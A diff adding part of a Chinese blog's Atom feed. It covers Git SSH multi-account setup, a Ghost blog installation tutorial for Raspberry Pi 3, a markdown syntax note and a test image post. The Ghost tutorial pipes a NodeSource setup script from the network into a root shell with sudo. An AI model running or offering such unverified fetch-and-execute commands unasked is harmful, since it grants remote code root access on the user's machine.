+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ssh -T git@github.com</div><div class="line"><span class="comment">#看到下面这一句说明验证成功</span></div><div class="line"><span class="comment">#Hi leolee! You've successfully authenticated, but GitHub does not provide shell access.</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>多用户认证<br>修改~/.ssh/config</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Host wind                   #Host 别名自定义</div><div class="line">    HostName github.com     #HostName 服务地址</div><div class="line">    User mofeng64@gmail.com #User 用户名</div><div class="line">    IdentityFile ~/work/db/github #密匙地址</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>参考:<br>    <a href="http://debugtalk.com/post/head-first-git-authority-verification/" rel="external nofollow noopener noreferrer" target="_blank">深入浅出Git权限校验</a><br>    <a href="http://www.jianshu.com/p/9fcd5522e86b" rel="external nofollow noopener noreferrer" target="_blank">云服务器之密钥认证和git hook配置</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;arch-Linux中Git命令自动补全&quot;&gt;&lt;a href=&quot;#arch-Linux中Git命令自动补全&quot; class=&quot;headerlink&quot; title=&quot;arch Linux中Git命令自动补全&quot;&gt;&lt;/a&gt;arch Linux中Git命令自动补全&lt;/h2&gt;&lt;
+    
+    </summary>
+    
+      <category term="工具" scheme="https://www.sysblz.com/categories/tools/"/>
+    
+    
+      <category term="git" scheme="https://www.sysblz.com/tags/git/"/>
+    
+      <category term="Linux" scheme="https://www.sysblz.com/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>树莓派3安装Ghost博客</title>
+    <link href="https://www.sysblz.com/article/4121126904.html"/>
+    <id>https://www.sysblz.com/article/4121126904.html</id>
+    <published>2017-08-15T16:28:31.000Z</published>
+    <updated>2017-08-15T16:28:31.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>现在Ghost博客升级很快，1.0版本以上用Ghost-cli方法安装，本教程是树莓派安装1.5.2版本</p>
+<h2 id="1-安装前准备"><a href="#1-安装前准备" class="headerlink" title="1. 安装前准备"></a>1. 安装前准备</h2><h3 id="1-1-系统版本检查"><a href="#1-1-系统版本检查" class="headerlink" title="1.1 系统版本检查"></a>1.1 系统版本检查</h3><p>最新版本Ghost需要在Ubuntu 16 上安装，如果你使用的是Raspbian系统请替换为Ubutun系统。<br>树莓派Ubutun系统请<a href="https://ubuntu-mate.org/raspberry-pi/" rel="external nofollow noopener noreferrer" target="_blank">参考该文章安装</a></p>
+<h3 id="1-3-软件依赖"><a href="#1-3-软件依赖" class="headerlink" title="1.3 软件依赖"></a>1.3 软件依赖</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update &amp;&amp; sudo apt-get upgrade -y</div><div class="line">sudo apt-get install nginx</div><div class="line">sudo apt-get install mariadb-server</div><div class="line">sudo ufw allow <span class="string">'Nginx Full'</span></div></pre></td></tr></table></figure>
+<p>mariadb 其实就是mysql只是我mysql被收购不开源了，mariadb是mysql创造者把mysql卖给oracle后的继续开源mysql<br>安装mariadb时要求输入root密码<br>ufw allow ‘Nginx Full’ 是允许HTTP和HTTPS访问</p>
+<h3 id="1-4-安装Node-js"><a href="#1-4-安装Node-js" class="headerlink" title="1.4 安装Node.js"></a>1.4 安装Node.js</h3><p>安装最新Nodejs，我安装时候Nodejs版本为(v6.11.1)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">curl -sL https://deb.nodesource.com/setup_6.x | sudo -E bash</div><div class="line">sudo apt-get install -y nodejs</div></pre></td></tr></table></figure></p>
+<h3 id="1-5-安装Ghost-Cli工具"><a href="#1-5-安装Ghost-Cli工具" class="headerlink" title="1.5 安装Ghost-Cli工具"></a>1.5 安装Ghost-Cli工具</h3><p>安装Ghost命令客户端<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo npm i -g ghost-cli</div></pre></td></tr></table></figure></p>
+<h3 id="1-6-用户准备"><a href="#1-6-用户准备" class="headerlink" title="1.6 用户准备"></a>1.6 用户准备</h3><h4 id="添加用户（如果不准备添加忽略）"><a href="#添加用户（如果不准备添加忽略）" class="headerlink" title="添加用户（如果不准备添加忽略）"></a>添加用户（如果不准备添加忽略）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">adduser &lt;username&gt;</div><div class="line">usermod -aG sudo &lt;username&gt;</div><div class="line">su - &lt;username&gt;</div></pre></td></tr></table></figure>
+<p>username 请添加你要添加的用户名</p>
+<h4 id="准备博客项目存放位置"><a href="#准备博客项目存放位置" class="headerlink" title="准备博客项目存放位置"></a>准备博客项目存放位置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo mkdir -p /var/www/ghost</div><div class="line">sudo chown [user]:[user] /var/www/ghost</div><div class="line">cd /var/www/ghost</div></pre></td></tr></table></figure>
+<h2 id="2-安装Ghost"><a href="#2-安装Ghost" class="headerlink" title="2. 安装Ghost"></a>2. 安装Ghost</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ghost install</div></pre></td></tr></table></figure>
+<p>等待下载最新版本Ghost，我安装的时候是1.5.2。安装过程中各种询问</p>
+<ol>
+<li>您博客的网址</li>
+<li>您的MySQL用户名（root默认情况下）</li>
+<li>您的MySQL密码（无论您在安装MySQL服务器时设置为什么）</li>
+<li>Ghost数据库名称（ghost_production默认情况下）</li>
+<li>无论你想要一个ghost用户</li>
+<li>是否要配置Nginx</li>
+<li>是否要设置SSL</li>
+<li>安装系统，所以你可以轻松地启动和停止Ghost</li>
+<li>是否要启动Ghost<br><img src="https://ws1.sinaimg.cn/large/006VAXiDgy1filybxi2sgj30n90dbdpj.jpg" alt=""></li>
+</ol>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;现在Ghost博客升级很快，1.0版本以上用Ghost-cli方法安装，本教程是树莓派安装1.5.2版本&lt;/p&gt;
+&lt;h2 id=&quot;1-安装前准备&quot;&gt;&lt;a href=&quot;#1-安装前准备&quot; class=&quot;headerlink&quot; title=&quot;1. 安装前准备&quot;&gt;&lt;/a&gt;1. 安
+    
+    </summary>
+    
+      <category term="树莓派" scheme="https://www.sysblz.com/categories/rpilinux/"/>
+    
+    
+      <category term="rpi" scheme="https://www.sysblz.com/tags/rpi/"/>
+    
+      <category term="ghost" scheme="https://www.sysblz.com/tags/ghost/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>markdown学习比较</title>
+    <link href="https://www.sysblz.com/article/2924683816.html"/>
+    <id>https://www.sysblz.com/article/2924683816.html</id>
+    <published>2017-08-13T16:41:44.000Z</published>
+    <updated>2017-08-13T16:41:44.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="斜体和粗体"><a href="#斜体和粗体" class="headerlink" title="斜体和粗体"></a>斜体和粗体</h3><p><strong>代码:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">*斜体*或_斜体_</div><div class="line">**粗体**</div><div class="line">***加粗斜体***</div><div class="line">~~删除线~~</div></pre></td></tr></table></figure></p>
+<ul>
+<li><strong>显示效果：</strong></li>
+<li><em>斜体</em>或<em>斜体</em></li>
+<li><strong>粗体</strong></li>
+<li><strong><em>加粗斜体</em></strong></li>
+<li><del>删除线</del></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;斜体和粗体&quot;&gt;&lt;a href=&quot;#斜体和粗体&quot; class=&quot;headerlink&quot; title=&quot;斜体和粗体&quot;&gt;&lt;/a&gt;斜体和粗体&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;代码:&lt;/strong&gt;&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;t
+    
+    </summary>
+    
+      <category term="学习" scheme="https://www.sysblz.com/categories/learn/"/>
+    
+    
+      <category term="学习" scheme="https://www.sysblz.com/tags/Learn/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>测速</title>
+    <link href="https://www.sysblz.com/article/1855984339.html"/>
+    <id>https://www.sysblz.com/article/1855984339.html</id>
+    <published>2017-08-13T12:28:14.000Z</published>
+    <updated>2017-08-13T12:28:14.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://moetu.fastmirror.org/images/2017/08/13/hacker-Guea61b.jpg" alt="Alt text"></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;https://moetu.fastmirror.org/images/2017/08/13/hacker-Guea61b.jpg&quot; alt=&quot;Alt text&quot;&gt;&lt;/p&gt;
+
+    
+    </summary>
+    
+      <category term="test" scheme="https://www.sysblz.com/categories/test/"/>
+    
+    
+      <category term="test" scheme="https://www.sysblz.com/tags/test/"/>
+    
+  </entry>
+  
+</feed>
